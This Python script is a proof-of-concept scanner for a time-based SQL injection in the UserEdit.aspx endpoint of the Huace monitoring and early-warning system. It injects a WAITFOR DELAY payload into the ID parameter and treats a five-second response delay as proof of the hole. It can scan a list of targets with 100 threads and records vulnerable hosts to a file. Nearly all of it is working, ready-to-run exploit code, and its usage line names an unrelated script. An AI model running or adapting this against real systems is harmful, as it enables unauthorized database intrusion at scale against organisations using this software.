import argparse
import requests
import os
import sys
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()

def banner():
    test = """ 
 _   _               _____    _ _ _                        
| | | |             |  ___|  | (_) |                       
| | | |___  ___ _ __| |__  __| |_| |_   __ _ ___ _ ____  __
| | | / __|/ _ \ '__|  __|/ _` | | __| / _` / __| '_ \ \/ /
| |_| \__ \  __/ |  | |__| (_| | | |_ | (_| \__ \ |_) >  < 
 \___/|___/\___|_|  \____/\__,_|_|\__(_)__,_|___/ .__/_/\_\
                                                | |        
                                                |_|        
                                                   author:sanhua
                                                   date:2024-09-04
                                                   version:1.0
"""
    print(test)

def main():
    banner()
    url_list = []
    parse = argparse.ArgumentParser(description="华测监测预警系统接口UserEdit.aspxSQL注入")
    parse.add_argument("-u", "--url", dest="url", type=str, help="Please enter url")
    parse.add_argument("-f", "--file", dest="file", type=str, help="Please enter file")
    args = parse.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        if not os.path.exists(args.file):
            print(f"[!] {args.file} 文件不存在，请检查路径")
            return
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url = url.strip()
                if url:  # 确保不添加空行
                    url_list.append(url)
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 360TQ.py -h")

def poc(target):
    if not target.startswith('http://') and not target.startswith('https://'):
        target = 'http://' + target  # 确保目标 URL 正确

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "close",
    }
    payload = "/Web/SysManage/UserEdit.aspx?&ID=1';WAITFOR+DELAY+'0:0:5'--"

    try:
        res = requests.get(url=target, verify=False, headers=headers, timeout=10)
        if res.status_code == 200:
            res1 = requests.post(url=target + payload, verify=False, headers=headers, timeout=10)
            res2 = requests.get(url=target, verify=False, headers=headers, timeout=10)
            time1 = res1.elapsed.total_seconds()  # 响应的时间
            time2 = res2.elapsed.total_seconds()
            if time1 - time2 >= 5:
                print(f"[+] {target} 存在sql延时注入漏洞")
                with open('result1.txt', 'a', encoding='utf-8') as f:
                    f.write(target + '\n')
            else:
                print(f"{target} 不存在SQL注入漏洞")
        else:
            print(f"[-] 无法访问 {target}，状态码: {res.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"{target} 请求失败: {e}")

if __name__ == '__main__':
    main()
